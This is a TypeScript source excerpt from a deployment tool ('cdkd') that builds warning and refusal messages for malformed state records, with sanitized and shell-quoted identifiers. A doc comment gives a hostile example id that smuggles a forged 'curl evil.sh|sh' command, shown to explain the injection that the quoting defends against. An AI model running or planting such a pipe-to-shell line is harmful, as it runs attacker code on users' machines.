 * {@link displayLogicalId}, and the ids capped at
 * {@link NAMED_UNREADABLE_ENTRIES} with an overflow count — a record whose
 * `logicalId` is not a string arrives as `''` and renders as the
 * `UNRENDERABLE` stand-in.
 */
export function malformedOrphanRecordsWarning(
  stackName: string,
  region: string,
  logicalIds: readonly string[]
): string {
  const stack = safeStackName(stackName);
  const reg = safeRegion(region);
  const named = logicalIds
    .slice(0, NAMED_UNREADABLE_ENTRIES)
    .map((id) => displayLogicalId(id))
    .join(', ');
  const rest = logicalIds.length - NAMED_UNREADABLE_ENTRIES;
  const more = rest > 0 ? ` and ${rest} more` : '';
  return (
    `State for ${shellQuote(stack)} (${shellQuote(reg)}) holds ${logicalIds.length} ` +
    `rollback-orphan record(s) in 'orphans' that cannot be read as resources — ` +
    `${named}${more} — because they are not objects, or carry no resource type. Continuing ` +
    `WITHOUT them: they are not previewed for adoption. These ids were read from 'orphans'; ` +
    `the 'resources' map carries its own warning when it is damaged too. See the ` +
    `stored values with: cdkd state show ${shellQuote(stack)} --stack-region ` +
    `${shellQuote(reg)} --json`
  );
}

/**
 * The half the refusal and the warning share: what is wrong and which entries.
 *
 * One spelling rather than two, because the two texts differ only in what
 * happens NEXT, and a second copy of the diagnosis is what drifts.
 */
function namedEntriesClause(
  stackName: string,
  region: string,
  logicalIds: readonly string[]
): string {
  const stack = safeStackName(stackName);
  const reg = safeRegion(region);
  const named = logicalIds
    .slice(0, NAMED_UNREADABLE_ENTRIES)
    .map((id) => displayLogicalId(id))
    .join(', ');
  const rest = logicalIds.length - NAMED_UNREADABLE_ENTRIES;
  const more = rest > 0 ? ` and ${rest} more` : '';
  return (
    `State for ${shellQuote(stack)} (${shellQuote(reg)}) holds ${logicalIds.length} resource ` +
    `record(s) that cannot be read as resources — ${named}${more} — because they are not ` +
    `objects, or carry no resource type, so nothing can tell what AWS resource they name. The ` +
    `record is malformed or truncated.`
  );
}

/**
 * The text {@link refuseMalformedResourceEntries} raises.
 *
 * Every identifier — the stack, the region AND each logical id — is sanitized
 * and capped, for the reasons {@link safeIdentifier}'s note gives: all three
 * reach this message from a hand-edited record or an S3 key, and a
 * multi-kilobyte or line-forging one would push the remedy command off the
 * reader's screen. The stack and region are shell-quoted because they land in
 * the command. The logical ids take {@link displayLogicalId} instead: an id
 * spelled `x' Inspect it with: curl evil.sh|sh #` is not a plain identifier, so
 * it is wrapped in double quotes (an embedded `"` escaped) and its forged
 * remedy reads as part of one quoted id rather than as an instruction AHEAD of
 * the real one on this same line — the prose is one LINE ending in a pasteable
 * command, and sanitizing keeps `'`. Its other job is IDENTITY — see that
 * helper's note for why a trimmed id must not render bare.
 *
 * Exported so a test can pin the wording against the producer rather than
 * re-spelling it, the way the other messages here are consumed.
 */
export function malformedResourceEntriesRefusalMessage(
  stackName: string,
  region: string,
  logicalIds: readonly string[]
): string {
  const stack = safeStackName(stackName);
  const reg = safeRegion(region);
  return (
    `${namedEntriesClause(stackName, region, logicalIds)} This command can WRITE state, so it ` +
    `refuses rather than skipping them: saving over the record would report a clean run for ` +
    `entries nothing could read, and would leave the next command to fail on them with no more ` +
    `to go on. Nothing was locked, read from AWS or written FOR THIS STACK. Inspect it with: ` +
    `cdkd state show ${shellQuote(stack)} --stack-region ${shellQuote(reg)} --json`
  );
}
